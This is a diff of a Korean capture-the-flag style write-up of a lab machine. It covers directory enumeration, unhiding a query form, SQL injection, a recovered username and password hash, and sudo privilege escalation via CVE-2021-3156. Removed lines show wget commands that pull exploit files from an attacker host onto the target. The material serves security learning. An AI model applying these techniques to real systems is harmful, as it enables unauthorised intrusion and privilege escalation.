@@ -23,19 +23,20 @@ gobuster dir -u http://192.168.56.143 -w /usr/share/wordlists/dirbuster/director
 
 /index.php  /index.html  /list.php  /add.php
 
+
 ## /index.php
 
 들어가보았지만 Not Found가 뜬다. 그래서 web source페이지를 보았다.
 
 ![Image](https://github.com/user-attachments/assets/aa4d56d4-28ef-4e82-9b66-baba5fad9edc)
 
-/H10000.txt
-
 ![Image](https://github.com/user-attachments/assets/520576de-79c4-4553-8a39-dfd7805ed9fb)
 
-H10000 값
+/H10000.txt
 
 ![Image](https://github.com/user-attachments/assets/432de6fe-9e2c-43fd-85b5-cea0166608b3)
+
+H10000 값
 
 
 ## /list.php
@@ -46,16 +47,16 @@ index.php에서 Not Found가 떠서 list.php를 들어가면 다음과 같은 �
 
 ![Image](https://github.com/user-attachments/assets/3662b62c-6cd9-4126-a512-355c599517ab)
 
-M1,M2,M3,M4 값이 중요하기 때문에 복붙
-
 ![Image](https://github.com/user-attachments/assets/e761c310-7b48-4307-bef6-122f69671eff)
+
+/index.php
 
 ![Image](https://github.com/user-attachments/assets/47239fa6-b91f-4f44-a8a0-5117113147f2)
 
 
 ## /add.php
 
-http://192.168.56.143/add.php에서 View Source Code를 들어가서 보면 쿼리 작성폼이라는 주석이있는 줄에 쿼리 작성 폼과 ID 조회하는 코드에 type=”hidden”이 되어 있는 것을 알 수 있다.
+http://192.168.56.143/add.php에서 View Source Code를 들어가서 보면 쿼리 작성폼이라는 주석이 있는 줄에 쿼리 작성 폼과 ID 조회하는 코드에 type=”hidden”이 되어 있는 것을 알 수 있다.
 
 ![Image](https://github.com/user-attachments/assets/0a49c75c-76f1-428e-806e-f37223e4c611)
 
@@ -71,13 +72,13 @@ type=”hidden” -> type=”submit” 변경
 
 ![Image](https://github.com/user-attachments/assets/5ef4b06f-da65-4cf9-b137-ae34d2fe3ee5)
 
+Mysql 쿼리 입력 부분 출력된다.
+
 ![Image](https://github.com/user-attachments/assets/892fc8e3-3334-4420-b366-18da9c542498)
 
-Mysql 쿼리 입력 부분 출력됨
+SQL Injection 공격 가능 – userID DB 확인 가능
 
 ![Image](https://github.com/user-attachments/assets/d5de20bf-3eb1-43bb-9e74-860b97a817c5)
-
-SQL Injection 공격 가능 – userID DB 확인 가능
 
 ![Image](https://github.com/user-attachments/assets/b771484d-4fb4-4428-99e6-3ff44d8853ad)
 
@@ -125,6 +126,8 @@ cr0sss1tescr1pt9
 password :
 df93ef64167b2334664ff59a5b8185f5
 
+(공백 없음)
+
 ![Image](https://github.com/user-attachments/assets/93817ac5-e880-4dd2-bf48-1dcaf8cbc4ac)
 
 
@@ -143,25 +146,21 @@ https://github.com/blasty/CVE-2021-3156  참조
 
 - brute.sh , hax.c , lib.c 파일 생성
 
-cr0sss1tescr1pt9 사용자는 vi,vim,nano 사용할 수 없다.
+- cr0sss1tescr1pt9 사용자는 vi,vim,nano 사용할 수 없다.
 
-kali-root 계정에서 /var/www/html/ 디렉터리에 파일 생성 후, cr0sss1tescr1pt9 사용자 계정에서 wget으로 파일을 다운로드한다.
+- kali-root 계정에서 /var/www/html/ 디렉터리에 파일 생성 후, cr0sss1tescr1pt9 사용자 계정에서 wget으로 파일을 다운로드한다.
 
 ![Image](https://github.com/user-attachments/assets/55b9071e-acd5-4125-a93a-0b9bf4691f41)
-```
-wget http://192.168.56.105/brute.sh
-```
+
 ![Image](https://github.com/user-attachments/assets/efbcb372-cd7d-44e4-a68f-a7b37b068949)
-```
-wget http://192.168.56.105/hax.c
-```
+
 ![Image](https://github.com/user-attachments/assets/a66c7d11-fd0d-44d6-928b-d18b5c20d8f6)
-```
-wget http://192.168.56.105/lib.c
-```
+
 ![Image](https://github.com/user-attachments/assets/1e57f253-9b9a-4791-a059-c80f5fb96e8a)
 
+
 https://github.com/blasty/CVE-2021-3156 - Makefile 참고
+- root flag
 
 ![Image](https://github.com/user-attachments/assets/10a28bff-12d4-4aed-808a-d153e2604233)
 
